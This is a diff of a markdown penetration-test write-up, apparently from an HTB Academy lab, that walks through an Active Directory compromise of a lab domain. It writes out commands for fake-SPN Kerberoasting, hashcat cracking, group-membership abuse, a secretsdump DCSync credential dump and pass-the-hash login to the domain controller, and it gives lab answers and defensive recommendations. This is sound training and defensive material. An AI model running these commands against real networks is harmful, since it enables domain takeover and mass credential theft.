@@ -1,4 +1,4 @@
-# Active Directory Compromise
+# 👑 Active Directory Compromise
 
 ## 🎯 Overview
 
@@ -7,6 +7,7 @@
 ## 🔍 BloodHound Attack Path Analysis
 
 ### 🎯 GenericWrite Privilege Discovery
+
 ```cmd
 # mssqladm account analysis:
 - GenericWrite over ttimmons user
@@ -18,6 +19,7 @@ GenericWrite → Fake SPN creation → Targeted Kerberoasting → Password crack
 ```
 
 ### 📊 Attack Chain Visualization
+
 ```cmd
 # Privilege escalation path:
 mssqladm (GenericWrite) → ttimmons (GenericAll) → Server Admins → DCSync
@@ -31,6 +33,7 @@ mssqladm (GenericWrite) → ttimmons (GenericAll) → Server Admins → DCSync
 ## 🎫 Targeted Kerberoasting Attack
 
 ### 🔧 Fake SPN Creation
+
 ```powershell
 # PSCredential object creation
 $SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
@@ -44,6 +47,7 @@ Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalnam
 ```
 
 ### 🎯 TGS Ticket Extraction
+
 ```bash
 # Targeted Kerberoasting attack
 proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons
@@ -58,6 +62,7 @@ $krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/ttimmons*$[HASH_DA
 ```
 
 ### 🔐 Password Cracking
+
 ```bash
 # Hashcat TGS cracking
 hashcat -m 13100 ttimmons_tgs /usr/share/wordlists/rockyou.txt
@@ -74,6 +79,7 @@ Progress.........: 10678272/14344385 (74.44%)
 ## 🔺 Server Admins Group Escalation
 
 ### 👥 Group Membership Manipulation
+
 ```powershell
 # PSCredential object for ttimmons
 $timpass = ConvertTo-SecureString '[CRACKED_PASSWORD]' -AsPlainText -Force
@@ -88,6 +94,7 @@ Add-DomainGroupMember -Identity $group -Members 'ttimmons' -Credential $timcreds
 ```
 
 ### 🎯 DCSync Privileges Inheritance
+
 ```cmd
 # Server Admins group capabilities:
 - GetChanges privilege (INLANEFREIGHT.LOCAL)
@@ -102,6 +109,7 @@ SERVER ADMINS → DCSync → INLANEFREIGHT.LOCAL domain
 ## 🔄 DCSync Attack Execution
 
 ### 💎 NTDS Database Extraction
+
 ```bash
 # Complete domain credential dump
 proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm
@@ -117,6 +125,7 @@ krbtgt:502:aad3b435b51404eeaad3b435b51404ee:[KRBTGT_HASH]
 ```
 
 ### 👑 Domain Administrator Access
+
 ```bash
 # Pass-the-Hash authentication to DC
 proxychains evil-winrm -i 172.16.8.3 -u Administrator -H [DOMAIN_ADMIN_HASH]
@@ -133,6 +142,7 @@ ipconfig → 172.16.8.3 (Domain Controller)
 ## 🎯 Post-Compromise Activities
 
 ### 📊 Complete Domain Control Validation
+
 ```cmd
 # Domain Administrator capabilities:
 - Complete Active Directory control
@@ -149,6 +159,7 @@ ipconfig → 172.16.8.3 (Domain Controller)
 ```
 
 ### 🔒 Cleanup and Documentation
+
 ```powershell
 # Remove fake SPN (operational security)
 Set-DomainObject -credential $Cred -Identity ttimmons -Clear serviceprincipalname -Verbose
@@ -166,6 +177,7 @@ Remove-DomainGroupMember -Identity "Server Admins" -Members 'ttimmons' -Credenti
 ## 🏆 Complete Attack Chain Summary
 
 ### 🚀 External → Domain Admin Path
+
 ```cmd
 # Phase 1: External Reconnaissance
 Nmap scans → DNS zone transfer → Subdomain discovery → 11 web applications
@@ -187,6 +199,7 @@ BloodHound analysis → GenericWrite abuse → Targeted Kerberoasting → DCSync
 ```
 
 ### 📋 Comprehensive Findings Summary
+
 ```cmd
 # Critical/High Risk Findings:
 1. Unrestricted File Upload → RCE
@@ -212,6 +225,7 @@ BloodHound analysis → GenericWrite abuse → Targeted Kerberoasting → DCSync
 ## 🛠️ Tools & Techniques Mastery
 
 ### 🔍 Reconnaissance Tools
+
 ```bash
 # External enumeration:
 Nmap, DNS zone transfers, EyeWitness, Gobuster, WPScan
@@ -224,6 +238,7 @@ Secretsdump, Mimikatz, LaZagne, Registry analysis
 ```
 
 ### ⚔️ Exploitation Techniques
+
 ```bash
 # Web application attacks:
 SQL injection, XSS, XXE, SSRF, File upload bypasses
@@ -238,6 +253,7 @@ Kerberoasting, Password spraying, DCSync, ACL abuse
 ## 🎯 HTB Academy Labs
 
 ### 📋 Final Lab Solutions
+
 ```cmd
 # Lab 1: Targeted Kerberoasting
 1. BloodHound analysis → GenericWrite identification
@@ -262,6 +278,7 @@ Kerberoasting, Password spraying, DCSync, ACL abuse
 ```
 
 ### 🔍 Professional Methodology Demonstrated
+
 ```cmd
 # Systematic approach:
 - Complete external enumeration before internal pivot
@@ -285,6 +302,7 @@ Kerberoasting, Password spraying, DCSync, ACL abuse
 ## 🛡️ Comprehensive Defensive Recommendations
 
 ### 🔒 Active Directory Hardening
+
 ```cmd
 # Privilege management:
 - Implement least privilege principles
@@ -306,6 +324,7 @@ Kerberoasting, Password spraying, DCSync, ACL abuse
 ```
 
 ### 🌐 Network Security
+
 ```cmd
 # Segmentation:
 - Implement proper network segmentation
@@ -318,4 +337,4 @@ Kerberoasting, Password spraying, DCSync, ACL abuse
 - Implement secure development practices
 - Deploy Web Application Firewalls
 - Regular vulnerability assessments
-``` 
+```
